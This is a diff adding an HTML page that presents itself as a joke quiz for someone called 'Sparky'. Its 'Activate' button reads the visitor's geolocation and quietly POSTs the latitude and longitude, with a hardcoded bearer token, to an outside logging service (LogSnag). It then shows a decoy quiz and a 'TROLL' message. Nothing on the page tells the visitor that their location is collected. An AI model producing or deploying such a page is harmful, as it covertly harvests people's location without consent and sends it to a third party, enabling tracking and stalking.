@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Static Template</title>
+  </head>
+    <h1 id="h1">HEY Sparky I made this</h1>
+    <h2 id="h2">Ain't it cool?</h2>
+
+  
+    <p id="h3">Now i'm going to have you answer some questions ok?</p>
+    <form id="form">
+        <input type="radio" id="ok" value="ok">
+        <label for="ok">Ok</label><br>
+        <input type="radio" id="no" value="No">
+        <label for="no">No</label><br>
+    </form>
+    <button id="done"type="button" onclick="done()">Submit</button>
+
+    <p id="h4">You know what im too lazy lolllllllllllll<br>Get TROLLLLLLLLLLLLLLLLLLLLLLLLL</p>
+    <button id="send" type="button" onclick="getLocation()">Activate</button>
+
+  </body>
+
+
+
+  <script>
+    document.getElementById("form").style.display="none";
+    document.getElementById("h1").style.display="none";
+    document.getElementById("h2").style.display="none";
+    document.getElementById("h3").style.display="none";
+    document.getElementById("h4").style.display="none";
+    document.getElementById("done").style.display="none";
+    eventtext = "Location";
+    icontext = "⁉️";
+    descriptiontext = "N/A";
+    bearer1 = "81eeecbcd731c4bc6d9d63d934aea849";
+    bearer2 = "7ae578379467fd1bb4f6f001325eddb5";
+    button = document.getElementById("send");
+    h1 = document.getElementById("h1");
+    h2 = document.getElementById("h2");
+    h3 = document.getElementById("h3");
+    form = document.getElementById("form");
+
+    function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(send);
+  } else { 
+    descriptiontext = "Geolocation is not supported by this browser.";
+    sned();
+  }
+}
+
+function Start() {
+  document.getElementById("send").style.display="none";
+      document.getElementById("form").style.display="block";
+      document.getElementById("h1").style.display="block";
+      document.getElementById("h2").style.display="block";
+      document.getElementById("h3").style.display="block";
+      document.getElementById("done").style.display="block";
+}
+
+function done() {
+  document.getElementById("h4").style.display="block";
+  document.getElementById("form").style.display="none";
+    document.getElementById("h1").style.display="none";
+    document.getElementById("h2").style.display="none";
+    document.getElementById("h3").style.display="none";
+    document.getElementById("done").style.display="none";
+}
+    function send(position) {
+      descriptiontext = "Latitude: " + position.coords.latitude + 
+  "   Longitude: " + position.coords.longitude;
+      if(eventtext == "" || eventtext == "")
+      {
+          alert("Event needs text");
+      }
+      else{
+      var myHeaders = new Headers();
+      myHeaders.append("Content-Type", "application/json");
+      myHeaders.append(
+        "Authorization",
+        "Bearer " + bearer2
+      );
+
+      var raw = JSON.stringify({
+        project: "game",
+        channel: "idk",
+        event: eventtext,
+        description: descriptiontext,
+        icon: icontext,
+        notify: true
+      });
+
+      var requestOptions = {
+        method: "POST",
+        headers: myHeaders,
+        body: raw,
+        redirect: "follow"
+      };
+
+      fetch("https://api.logsnag.com/v1/log", requestOptions)
+        .then((response) => response.text())
+        .then((result) => console.log(result))
+        .catch((error) => console.log("error", error));
+        Start();
+    }
+  }
+  </script>
+</html>
